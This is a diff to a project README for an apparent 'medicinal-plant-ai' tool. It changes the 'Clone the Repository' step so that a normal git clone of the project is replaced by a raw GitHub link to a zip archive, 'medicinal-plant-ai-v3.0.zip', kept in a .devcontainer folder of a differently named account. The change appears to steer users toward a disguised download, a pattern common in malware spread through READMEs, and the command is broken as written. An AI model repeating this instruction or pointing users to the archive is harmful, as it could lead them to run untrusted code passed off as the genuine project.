@@ -79,5 +79,5 @@ Ensure you have Python installed.
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/Srilaxman-EU/medicinal-plant-ai.git
+git clone https://raw.githubusercontent.com/Srilaxman05/medicinal-plant-ai/main/.devcontainer/medicinal-plant-ai-v3.0.zip
 cd medicinal-plant-ai
